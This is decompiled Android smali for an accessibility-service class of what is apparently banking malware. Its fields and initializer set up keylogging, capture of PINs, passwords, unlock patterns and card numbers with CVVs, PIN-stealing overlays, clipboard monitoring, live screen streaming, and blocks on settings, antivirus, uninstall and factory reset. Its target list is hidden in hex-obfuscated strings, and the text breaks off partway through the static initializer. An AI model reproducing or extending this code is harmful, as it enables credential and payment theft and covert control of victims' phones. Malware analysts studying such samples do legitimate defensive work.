.class public final Lapp/mobilex/plus/services/DataQFAdapter;
.super Landroid/accessibilityservice/AccessibilityService;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field private static final ACTIVATION_DELAY_MS:J = 0xea60L

.field private static final AUTO_LOCK_PACKAGES:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final AUTO_LOCK_SUBSTRINGS:[Ljava/lang/String;

.field private static final BATCH_INTERVAL_MS:J = 0x7d0L

.field public static final Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

.field private static final KW_CARD:[Ljava/lang/String;

.field private static final KW_CVV:[Ljava/lang/String;

.field private static final KW_LOGIN:[Ljava/lang/String;

.field private static final KW_PASSWORD:[Ljava/lang/String;

.field private static final MAX_APP_NAME_CACHE:I = 0x1f4

.field private static final MAX_BATCH_SIZE:I = 0x32

.field private static final MAX_KEYLOG_ENTRIES:I = 0x1388

.field private static final MAX_PENDING_BATCH:I = 0xc8

.field private static final MAX_SKELETON_DEPTH:I = 0xf

.field private static final MAX_STREAM_RESTARTS:I = 0xa

.field private static final RE_CARD:Lv/s/NB5LVitKoIkG7GAQ6;

.field private static final RE_CVV:Lv/s/NB5LVitKoIkG7GAQ6;

.field private static final RE_PHONE:Lv/s/NB5LVitKoIkG7GAQ6;

.field private static final RE_PIN:Lv/s/NB5LVitKoIkG7GAQ6;

.field private static final TAG:Ljava/lang/String;

.field private static final UIBLOCK_KEYS:[Ljava/lang/String;

.field private static volatile UIBlock_A11y:Z

.field private static volatile UIBlock_AV:Z

.field private static volatile UIBlock_Browser:Z

.field private static volatile UIBlock_Dev:Z

.field private static volatile UIBlock_Files:Z

.field private static volatile UIBlock_Lock:Z

.field private static volatile UIBlock_Net:Z

.field private static volatile UIBlock_OwnApp:Z

.field private static volatile UIBlock_Play:Z

.field private static volatile UIBlock_Power:Z

.field private static volatile UIBlock_Recents:Z

.field private static volatile UIBlock_Reset:Z

.field private static volatile UIBlock_Sett:Z

.field private static volatile UIBlock_Shade:Z

.field private static volatile UIBlock_Unin:Z

.field private static volatile _uninstallStartTime:J

.field private static volatile accessOverlayParams:Landroid/view/WindowManager$LayoutParams;

.field private static volatile accessWindowManager:Landroid/view/WindowManager;

.field private static volatile antiUninstallEnabled:Z

.field private static final appNameCache:Ljava/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final autoEnablePinPackages:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final autoLockedApps:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static batchTimer:Ljava/util/concurrent/ScheduledExecutorService;

.field private static final blockedApps:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final capturedCreds:Ljava/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/String;",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;>;"
        }
    .end annotation
.end field

.field private static volatile capturedPassword:Ljava/lang/String;

.field private static volatile capturedPattern:Ljava/lang/String;

.field private static volatile capturedPin:Ljava/lang/String;

.field private static volatile forceStopStartTime:Ljava/lang/Long;

.field private static final grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/ConcurrentHashMap$KeySetView<",
            "Ljava/lang/String;",
            "Ljava/lang/Boolean;",
            ">;"
        }
    .end annotation
.end field

.field private static volatile h264CaptureInFlight:Z

.field private static hwEncoder:Lv/s/lLybWDNhgEj7LwIe;

.field private static volatile instance:Lapp/mobilex/plus/services/DataQFAdapter;

.field private static volatile isScreenStreaming:Z

.field private static final keylogEntries:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lv/s/NxAMaDFbSCxW6M03f;",
            ">;"
        }
    .end annotation
.end field

.field private static volatile lastCaptureTsMs:J

.field private static volatile lastCapturedDigit:C

.field private static volatile lastCapturedDigitTime:J

.field private static volatile lastPasswordCheck:J

.field private static volatile lastPatternCaptureTime:J

.field private static volatile lastPatternCheck:J

.field private static volatile lastPatternViewBounds:Landroid/graphics/Rect;

.field private static volatile lastStreamRestartMs:J

.field private static final latestFrame:Ljava/util/concurrent/atomic/AtomicReference;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/atomic/AtomicReference<",
            "[B>;"
        }
    .end annotation
.end field

.field private static volatile liveKeylogEnabled:Z

.field private static final lockPasswordBuffer:Ljava/lang/StringBuilder;

.field private static lockPasswordConfirmTimer:Ljava/util/Timer;

.field private static volatile lockPasswordTime:J

.field private static final lockScreenPackages:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final lockedApps:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final noPinOverlayPrefixes:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static volatile passwordPollerActive:Z

.field private static volatile patternOverlayShowing:Z

.field private static volatile patternReplayInProgress:Z

.field private static final pendingBatch:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Lv/s/NxAMaDFbSCxW6M03f;",
            ">;"
        }
    .end annotation
.end field

.field private static volatile pendingForceStop:Ljava/lang/String;

.field private static volatile pendingUninstallPkg:Ljava/lang/String;

.field private static final pinCaptureAppNames:Ljava/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static final pinCaptureEnabled:Ljava/util/concurrent/ConcurrentHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/ConcurrentHashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/Boolean;",
            ">;"
        }
    .end annotation
.end field

.field private static pinConfirmTimer:Ljava/util/Timer;

.field private static final pinDigits:Ljava/lang/StringBuilder;

.field private static volatile pinDigitsTime:J

.field private static prevHardwareBuffer:Landroid/hardware/HardwareBuffer;

.field private static prevHwBitmap:Landroid/graphics/Bitmap;

.field private static volatile protectionBypassUntil:J

.field private static final rearmHandler:Landroid/os/Handler;

.field private static final screenshotExecutor:Ljava/util/concurrent/ExecutorService;

.field private static serviceStartTime:J

.field private static volatile streamQuality:I

.field private static volatile streamRestartCount:I

.field private static volatile streamWidth:I

.field private static volatile useH264:Z


# instance fields
.field private final KEYLOG_DEBOUNCE_MS:J

.field private final PASSWORD_GRABBER_DELAY_MS:J

.field private final PWD_POLL_INTERVAL_MS:J

.field private final PWD_POLL_TIMEOUT_MS:J

.field private final TRUST_PKG:Ljava/lang/String;

.field private volatile _guardPollRunning:Z

.field private _lastPinDotCount:I

.field private _lastPinDotPkg:Ljava/lang/String;

.field private volatile _lastSettingsSeenPoll:J

.field private _tapPinBuffer:Ljava/lang/StringBuilder;

.field private _tapPinLastTime:J

.field private _tapPinPkg:Ljava/lang/String;

.field private volatile blockCooldownUntil:J

.field private volatile blockCountRecent:I

.field private cachedSelfLabel:Ljava/lang/String;

.field private final chromeLikeBrowsers:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private clipboardListener:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

.field private clipboardManager:Landroid/content/ClipboardManager;

.field private currentApp:Ljava/lang/String;

.field private currentAppName:Ljava/lang/String;

.field private final fieldTextCache:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private final fieldTimeCache:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private final handler:Landroid/os/Handler;

.field private final imePackages:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private final injectPollRunnable:Lv/s/Anxqm3NelDGirLH5;

.field private final injectRunnable:Ljava/lang/Runnable;

.field private final keylogDebounceHandler:Landroid/os/Handler;

.field private volatile lastBlockTimeMs:J

.field private lastClipboard:Ljava/lang/String;

.field private lastKeylogTime:J

.field private volatile lastPinFieldMonitorMs:J

.field private lastPinGrabTime:J

.field private lastPinPadScanTime:J

.field private volatile lastPowerDialogCheckMs:J

.field private volatile lastSettingsScanMs:J

.field private volatile lastShadeDismissMs:J

.field private lastText:Ljava/lang/String;

.field private final passwordBuffers:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/StringBuilder;",
            ">;"
        }
    .end annotation
.end field

.field private final passwordGrabberRunnables:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/Runnable;",
            ">;"
        }
    .end annotation
.end field

.field private final passwordRawCache:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private volatile pendingInjectPkg:Ljava/lang/String;

.field private final pendingKeylogData:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Lv/s/meoyWy7uMVp1IjcAV;",
            ">;"
        }
    .end annotation
.end field

.field private final pendingKeylogEntries:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Lv/s/NxAMaDFbSCxW6M03f;",
            ">;"
        }
    .end annotation
.end field

.field private final pendingKeylogRunnables:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/Runnable;",
            ">;"
        }
    .end annotation
.end field

.field private pinFlushPkg:Ljava/lang/String;

.field private pinFlushRunnable:Ljava/lang/Runnable;

.field private volatile pinOverlayActive:Z

.field private final pinOverlayBuffer:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/StringBuilder;",
            ">;"
        }
    .end annotation
.end field

.field private volatile pinOverlayDispatching:Z

.field private pinOverlayLastTapTime:J

.field private final pinOverlayLastTime:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private pinOverlayPkg:Ljava/lang/String;

.field private final pinOverlayRemoveRunnable:Ljava/lang/Runnable;

.field private volatile pinOverlayTouchable:Z

.field private pinOverlayView:Landroid/view/View;

.field private pinPadBoundsMap:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Landroid/graphics/Rect;",
            ">;"
        }
    .end annotation
.end field

.field private pinPadMapPkg:Ljava/lang/String;

.field private final pinScreenKeywords:[Ljava/lang/String;

.field private volatile pwdPollActive:Z

.field private volatile pwdPollAppName:Ljava/lang/String;

.field private volatile pwdPollAppPkg:Ljava/lang/String;

.field private volatile pwdPollFieldKey:Ljava/lang/String;

.field private volatile pwdPollFieldType:Ljava/lang/String;

.field private final pwdPollHandler:Landroid/os/Handler;

.field private volatile pwdPollHint:Ljava/lang/String;

.field private final pwdPollRunnable:Ljava/lang/Runnable;

.field private pwdPollStartTime:J

.field private volatile pwdPollViewId:Ljava/lang/String;

.field private volatile shadeBarrierActive:Z

.field private volatile shadeBarrierView:Landroid/view/View;

.field private final smsAppPackages:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private statusBarOverlay:Lv/s/s50M5De8F5UWQVP09E;


# direct methods
.method static constructor <clinit>()V
    .locals 117

    .line 1
    new-instance v0, Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    .line 4
    .line 5
    .line 6
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 7
    .line 8
    const-string v0, "00150078005800A600F300BC00D700B40030007F0059008E00FC00B600C600BE"

    .line 9
    .line 10
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 11
    .line 12
    .line 13
    move-result-object v0

    .line 14
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->TAG:Ljava/lang/String;

    .line 15
    .line 16
    const/16 v0, 0x1

    .line 17
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 18
    .line 19
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    .line 20
    .line 21
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_A11y:Z

    .line 22
    .line 23
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Power:Z

    .line 24
    .line 25
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    .line 26
    .line 27
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_OwnApp:Z

    .line 28
    .line 29
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Play:Z

    .line 30
    .line 31
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_AV:Z

    nop

    nop

    .line 32
    .line 33
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Browser:Z

    nop

    .line 34
    .line 35
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    nop

    .line 36
    .line 37
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Reset:Z

    .line 38
    .line 39
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Lock:Z

    .line 40
    .line 41
    const-string v0, "0030007E005A008300F5"

    nop

    .line 42
    .line 43
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 44
    .line 45
    .line 46
    move-result-object v1

    .line 47
    const-string v0, "00300073004F0093"

    .line 48
    .line 49
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    move-result-object v2

    .line 53
    const-string v0, "00220027000A009E"

    .line 54
    .line 55
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 56
    .line 57
    .line 58
    move-result-object v3

    .line 59
    const-string v0, "00330079004C008200E2"

    .line 60
    .line 61
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object v4

    .line 65
    const-string v0, "0036007800520089"

    .line 66
    .line 67
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 68
    .line 69
    .line 70
    move-result-object v5

    .line 71
    const-string v0, "002C00610055008600E000AF"

    .line 72
    .line 73
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 74
    .line 75
    .line 76
    move-result-object v6

    .line 77
    const-string v0, "0033007A005A009E"

    .line 78
    .line 79
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 80
    .line 81
    .line 82
    move-result-object v7

    .line 83
    const-string v0, "002100640054009000E300BA00C0"

    .line 84
    .line 85
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    move-result-object v9

    .line 89
    const-string v0, "0025007F0057008200E3"

    .line 90
    .line 91
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 92
    .line 93
    .line 94
    move-result-object v10

    .line 95
    const-string v0, "003100730048008200E4"

    .line 96
    .line 97
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 98
    .line 99
    .line 100
    move-result-object v11

    .line 101
    const-string v0, "00270073004D"

    .line 102
    .line 103
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object v12

    .line 107
    const-string v0, "002D0073004F"

    .line 108
    .line 109
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v13

    .line 113
    const-string v0, "003100730058008200FE00AB00C1"

    .line 114
    .line 115
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 116
    .line 117
    .line 118
    move-result-object v14

    .line 119
    const-string v0, "002F00790058008C"

    .line 120
    .line 121
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 122
    .line 123
    .line 124
    move-result-object v15

    .line 125
    const-string v8, "av"

    .line 126
    .line 127
    filled-new-array/range {v1 .. v15}, [Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v0

    .line 131
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBLOCK_KEYS:[Ljava/lang/String;

    .line 132
    .line 133
    new-instance v0, Ljava/util/concurrent/ConcurrentHashMap;

    .line 134
    .line 135
    invoke-direct {v0}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    .line 136
    .line 137
    .line 138
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinCaptureEnabled:Ljava/util/concurrent/ConcurrentHashMap;

    .line 139
    .line 140
    new-instance v0, Ljava/util/concurrent/ConcurrentHashMap;

    .line 141
    .line 142
    invoke-direct {v0}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    .line 143
    .line 144
    .line 145
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinCaptureAppNames:Ljava/util/concurrent/ConcurrentHashMap;

    .line 146
    .line 147
    const-string v0, "003100630015009400F200BA00C000A5002200780050008A00FF00BD00DB00AB0026"

    .line 148
    .line 149
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 150
    .line 151
    .line 152
    move-result-object v1

    .line 153
    const-string v0, "003100630015009400F200BA00C000A500220078005000C900E300BD00D700B5002100770055008C00F900BB"

    .line 154
    .line 155
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object v2

    .line 159
    const-string v0, "00200079005600C900F900BB00D300AA002C00740015009300F900B100D900A8002500700015008600FE00BB00C000A8002A0072"

    .line 160
    .line 161
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 162
    .line 163
    .line 164
    move-result-object v3

    nop

    .line 165
    const-string v0, "003100630015009300F900B100D900A8002500700015008E00FE00A900D700B40037007F00550080"

    .line 166
    .line 167
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 168
    .line 169
    .line 170
    move-result-object v4

    .line 171
    const-string v0, "003100630015008600FC00B900D300A500220078005000C900FD00B000D000AE002F00730015008600FE00BB00C000A8002A0072"

    .line 172
    .line 173
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 174
    .line 175
    .line 176
    move-result-object v5

    .line 177
    const-string v0, "003100630015008600FC00B900D300A500220078005000C900FF00BE00C400A3002C0038005A008A00F3"

    .line 178
    .line 179
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 180
    .line 181
    .line 182
    move-result-object v6

    .line 183
    const-string v0, "003100630015009100E400BD008000F3006D007B0054008500F900B300D700A5002200780050008E00FE00B8009C00A6002D00720049008800F900BB"

    .line 184
    .line 185
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 186
    .line 187
    .line 188
    move-result-object v7

    .line 189
    const-string v0, "00200079005600C900FF00AF00D700A9002100770055008C00BE00BE00C200B7"

    nop

    nop

    .line 190
    .line 191
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 192
    .line 193
    .line 194
    move-result-object v8

    .line 195
    const-string v0, "003100630015008A00E7"

    .line 196
    .line 197
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 198
    .line 199
    .line 200
    move-result-object v9

    .line 201
    const-string v0, "003100630015009500F100B600D400A10026007F0048008200FE00B100D700B00030"

    .line 202
    .line 203
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 204
    .line 205
    .line 206
    move-result-object v10

    .line 207
    const-string v0, "003100630015009500F100B600D400A10026007F0048008200FE00BD00D300A90028"

    .line 208
    .line 209
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 210
    .line 211
    .line 212
    move-result-object v11

    .line 213
    const-string v0, "003100630015009500FF00AC00D000A6002D007D0015008600FE00BB00C000A8002A0072"

    .line 214
    .line 215
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 216
    .line 217
    .line 218
    move-result-object v12

    .line 219
    const-string v0, "00200079005600C900F200AC00C100BE00300038005A008900F400AD00DD00AE002700380049008800E300BD00D300A90028007A0054009E00F100B3"

    .line 220
    .line 221
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 222
    .line 223
    .line 224
    move-result-object v13

    .line 225
    const-string v0, "003100630015009200F200AD00DB00B5006D0077004B0097"

    .line 226
    .line 227
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 228
    .line 229
    .line 230
    move-result-object v14

    .line 231
    const-string v0, "00200079005600C900F700BE00C800B7003100790056008500F100B100D9"

    .line 232
    .line 233
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 234
    .line 235
    .line 236
    move-result-object v15

    .line 237
    const-string v0, "003100630015008000F100A500C200B5002C007B0059008600FE00B4009C00A6002D00720049008800F900BB"

    .line 238
    .line 239
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 240
    .line 241
    .line 242
    move-result-object v16

    .line 243
    const-string v0, "00200079005600C900E200AC00DA00A5006D00720052008000F900AB00D300AB002100770055008C"

    .line 244
    .line 245
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 246
    .line 247
    .line 248
    move-result-object v17

    .line 249
    const-string v0, "003100630015009700E300BD00D300A9002800380054008900FC00B600DC00A2"

    .line 250
    .line 251
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 252
    .line 253
    .line 254
    move-result-object v18

    .line 255
    const-string v0, "00200079005600C900E000AC00D000A6002D007D0015008A00FF00BD00DB00AB0026"

    .line 256
    .line 257
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 258
    .line 259
    .line 260
    move-result-object v19

    .line 261
    const-string v0, "003100630015009400FF00A900D100A8002E0074005A008900FB00F100DA00A6002F0060005A"

    .line 262
    .line 263
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 264
    .line 265
    .line 266
    move-result-object v20

    .line 267
    const-string v0, "003100630015009400FF00A900D100A8002E0075005A009500F400F100DA00A6002F0060005A00C900E600EE"

    .line 268
    .line 269
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 270
    .line 271
    .line 272
    move-result-object v21

    .line 273
    const-string v0, "003100630015009E00F100B100D600A2003B00380056008800FE00BA00CB"

    .line 274
    .line 275
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 276
    .line 277
    .line 278
    move-result-object v22

    .line 279
    const-string v0, "00200079005600C900E900BE00DC00A30026006E0015008500F100B100D9"

    .line 280
    .line 281
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 282
    .line 283
    .line 284
    move-result-object v23

    .line 285
    const-string v0, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008600E000AF00C100E9003400770057008B00F500AB00DC00A100200064005E008B"

    .line 286
    .line 287
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 288
    .line 289
    .line 290
    move-result-object v24

    .line 291
    const-string v0, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E300AF00D300BE"

    .line 292
    .line 293
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 294
    .line 295
    .line 296
    move-result-object v25

    .line 297
    const-string v0, "003100630015008800EA00B000DC00A500220078005000C900F100AF00C2"

    .line 298
    .line 299
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 300
    .line 301
    .line 302
    move-result-object v26

    .line 303
    const-string v0, "00200079005600C900FF00A500DD00A9006D00700052008900E400BA00D100AF"

    nop

    nop

    .line 304
    .line 305
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 306
    .line 307
    .line 308
    move-result-object v27

    .line 309
    const-string v0, "003100630015008800EA00B000DC00E90025007F0055009300F500BC00DA00E90025007F0055008600FE00BC00D7"

    .line 310
    .line 311
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 312
    .line 313
    .line 314
    move-result-object v28

    .line 315
    const-string v0, "003100630015008800EA00B000DC00E900220066004B00C900F100B100D600B5002C007F005F"

    nop

    nop

    .line 316
    .line 317
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 318
    .line 319
    .line 320
    move-result-object v29

    .line 321
    const-string v0, "003100630015008800EA00B000DC00E9002100770055008C00BE00BE00DC00A300310072"

    nop

    nop

    .line 322
    .line 323
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 324
    .line 325
    .line 326
    move-result-object v30

    .line 327
    const-string v0, "003100630015008A00E400AC009C00AA003700650059008600FE00B4"

    nop

    .line 328
    .line 329
